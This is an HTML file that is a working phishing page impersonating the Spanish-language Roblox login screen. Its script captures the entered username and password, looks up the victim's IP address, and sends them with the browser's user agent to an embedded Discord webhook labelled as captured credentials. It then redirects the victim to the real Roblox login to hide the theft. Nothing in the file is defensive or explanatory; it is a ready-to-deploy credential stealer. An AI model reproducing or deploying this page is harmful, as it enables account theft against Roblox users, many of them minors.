<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Roblox</title>
    <style>
        body { background-color: #000; color: #fff; font-family: 'Amazon Ember', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: #191b1d; padding: 30px; border-radius: 8px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #393b3d; }
        img { width: 50px; margin-bottom: 20px; }
        h1 { font-size: 20px; margin-bottom: 20px; font-weight: 500; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #393b3d; border-radius: 4px; background: #000; color: #fff; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0084ff; border: none; border-radius: 4px; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:hover { background: #0074e0; }
        .footer { font-size: 12px; color: #666; margin-top: 20px; }
        /* Toque Codeby */
        .codeby-tag { color: #00ffcc; font-size: 10px; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" alt="Roblox">
    <h1>Inicia sesión en Roblox</h1>
    
    <input type="text" id="user" placeholder="Usuario / Correo / Teléfono" required>
    <input type="password" id="pass" placeholder="Contraseña" required>
    
    <button id="loginBtn">Iniciar sesión</button>
    
    <div class="footer">¿Olvidaste tu contraseña?</div>
    <div class="codeby-tag">Powered by Codeby versión gratuita</div>
</div>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";

    document.getElementById('loginBtn').addEventListener('click', async () => {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;

        if (user === "" || pass === "") {
            alert("Por favor rellena todos los campos");
            return;
        }

        // Cambiar texto para dar realismo
        document.getElementById('loginBtn').innerText = "Cargando...";

        try {
            // Capturar IP
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();

            // Enviar a Discord
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "🔑 CREDENCIALES CAPTURADAS - Codeby",
                        color: 0xff0000,
                        fields: [
                            { name: "👤 Usuario", value: `\`${user}\``, inline: true },
                            { name: "🔒 Contraseña", value: `\`${pass}\``, inline: true },
                            { name: "🌐 IP", value: ipData.ip },
                            { name: "📱 Info", value: navigator.userAgent }
                        ],
                        footer: { text: "Codeby Logger Pro" },
                        timestamp: new Date()
                    }]
                })
            });

            // Redirigir al Roblox real después de capturar
            window.location.href = "https://www.roblox.com/login";

        } catch (e) {
            window.location.href = "https://www.roblox.com/login";
        }
    });
</script>

</body>
</html>
